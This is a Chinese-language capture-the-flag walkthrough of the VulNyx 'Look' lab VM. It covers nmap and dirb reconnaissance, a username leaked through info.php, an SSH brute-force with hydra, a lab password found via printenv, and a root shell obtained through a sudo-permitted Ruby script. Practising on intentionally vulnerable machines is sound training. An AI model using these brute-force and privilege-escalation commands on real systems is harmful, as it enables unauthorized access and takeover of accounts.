# 环境

来自[Vulny_Look](https://vulnyx.com/#Look)，通过信息泄露爆破ssh，ruby提权

# 信息收集

## 主机发现

```bash
nmap -sn 192.168.88.0/24
```

![image-20240906091529127](image/image-20240906091529127.png)

## 端口扫描

```bash
sudo nmap -sT -r -p- 192.168.10.11
```

![image-20240906091647308](image/image-20240906091647308.png)

## 详情探测

```bash
sudo nmap -sV -sC -p22,80 -O 192.168.10.11
```

![image-20240906091828157](image/image-20240906091828157.png)

## 目录扫描

```bash
dirb http://192.168.10.11
```

![image-20240906092351884](image/image-20240906092351884.png)

# web渗透

## info.php敏感信息

访问http://192.168.10.11/info.php，搜索user可泄露用户名

![image-20240906092507168](image/image-20240906092507168.png)

## ssh爆破

```bash
hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.11 -o output.txt
```

![image-20240906093540127](image/image-20240906093540127.png)

## 用户泄露

```bash
printenv #环境变量发现用户密码
用户：dylan
密码：bl4bl4Dyl4N
```

![image-20240906100305468](image/image-20240906100305468.png)

## 提权

```bash
sudo -l
file /usr/bin/nokogiri #发现是一个ruby脚本
cat /usr/bin/nokogiri
sudo -u root /usr/bin/nokogiri .profile -e "exec '/bin/bash'"
```

[ruby提权](https://gtfobins.github.io/gtfobins/ruby/)

![image-20240906102312670](image/image-20240906102312670.png)